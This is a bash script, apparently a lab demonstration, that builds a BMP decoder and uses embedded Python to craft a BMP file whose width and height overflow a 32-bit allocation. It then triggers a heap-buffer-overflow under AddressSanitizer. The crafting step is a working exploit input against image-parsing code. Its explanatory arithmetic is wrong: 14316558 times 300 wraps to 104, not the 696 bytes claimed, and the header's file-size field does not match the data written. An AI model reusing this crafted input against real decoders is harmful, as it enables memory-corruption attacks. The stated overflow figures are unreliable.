#!/usr/bin/env bash
set -e

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
BIN="$DIR/bmp_decoder"

if [ ! -f "$BIN" ]; then
    echo "[*] Compiling $BIN..."
    make -C "$DIR"
fi

echo "================================================================="
echo "PHASE 1: Parsing Valid 8x8 24-bit BMP Image"
echo "================================================================="
"$BIN" "$DIR/sample.bmp"

echo ""
echo "================================================================="
echo "PHASE 2: Generating Crafted BMP with Multiplicative Dimension Wrap"
echo "Crafting header: Width = 100 (stride = 300 bytes), Height = 14,316,558"
echo "Calculated 32-bit allocation: 14316558 * 300 = 696 bytes!"
echo "================================================================="

python3 -c '
import struct

# Craft a malicious BMP header where width*height wraps around to 696 bytes
# file header: 14 bytes
file_hdr = struct.pack("<HIHHI", 0x4D42, 54 + 5000, 0, 0, 54)
# info header: 40 bytes
# biWidth = 100, biHeight = 14316558 (0x00DA740E)
info_hdr = struct.pack("<iiiHHIIiiII", 40, 100, 14316558, 1, 24, 0, 696, 2835, 2835, 0, 0)

with open("'$DIR'/crafted_overflow.bmp", "wb") as f:
    f.write(file_hdr)
    f.write(info_hdr)
    # Write 3000 bytes of pixel rows (exceeds the 696-byte wrapped allocation)
    f.write(b"\xAA" * 3000)
'

echo "[+] Crafted file created: crafted_overflow.bmp"
xxd "$DIR/crafted_overflow.bmp" | head -n 8

echo ""
echo "================================================================="
echo "PHASE 3: Parsing Crafted File Under AddressSanitizer"
echo "Notice how ASan intercepts the heap-buffer-overflow caused by the wrap:"
echo "================================================================="
set +e
"$BIN" "$DIR/crafted_overflow.bmp"
STATUS=$?
set -e
echo "[!] Process terminated with ASan status: $STATUS"
